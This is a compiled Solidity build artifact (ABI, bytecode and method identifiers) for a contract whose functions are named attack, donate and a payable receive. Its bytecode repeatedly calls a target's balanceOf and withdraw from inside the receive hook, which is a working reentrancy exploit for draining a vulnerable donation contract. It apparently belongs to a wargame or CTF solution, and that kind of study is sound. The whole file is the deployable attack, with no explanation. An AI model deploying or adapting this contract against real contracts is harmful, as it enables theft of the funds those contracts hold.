{"abi":[{"type":"constructor","inputs":[{"name":"_target","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"donate","inputs":[],"outputs":[],"stateMutability":"payable"}],"bytecode":{"object":"0x60a060405234801561001057600080fd5b506040516103cd3803806103cd8339818101604052602081101561003357600080fd5b5051606081901b6001600160601b0319166080526001600160a01b031661035d61007060003980605f528061019a5280610286525061035d6000f3fe60806040526004361061002d5760003560e01c80639e5faafc1461014e578063ed88c68e1461016557610149565b3661014957604080516370a0823160e01b8152306004820152905173ffffffffffffffffffffffffffffffffffffffff7f00000000000000000000000000000000000000000000000000000000000000001691632e1a7d4d9183916370a08231916024808301926020929190829003018186803b1580156100ad57600080fd5b505afa1580156100c1573d6000803e3d6000fd5b505050506040513d60208110156100d757600080fd5b5051604080517fffffffff0000000000000000000000000000000000000000000000000000000060e085901b168152600481019290925251602480830192600092919082900301818387803b15801561012f57600080fd5b505af1158015610143573d6000803e3d6000fd5b50505050005b600080fd5b34801561015a57600080fd5b5061016361016d565b005b610163610284565b604080516370a0823160e01b8152306004820152905173ffffffffffffffffffffffffffffffffffffffff7f00000000000000000000000000000000000000000000000000000000000000001691632e1a7d4d9183916370a08231916024808301926020929190829003018186803b1580156101e857600080fd5b505afa1580156101fc573d6000803e3d6000fd5b505050506040513d602081101561021257600080fd5b5051604080517fffffffff0000000000000000000000000000000000000000000000000000000060e085901b168152600481019290925251602480830192600092919082900301818387803b15801561026a57600080fd5b505af115801561027e573d6000803e3d6000fd5b50505050565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1662362a9534306040518363ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1681526020019150506000604051808303818588803b15801561030c57600080fd5b505af1158015610320573d6000803e3d6000fd5b505050505056fea2646970667358221220f18b8207e33ed3e7a39ecfbe3c2d3360d646ff1f9652b93c1d6d88676d01d64f64736f6c634300060c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","donate()":"ed88c68e"},"id":0}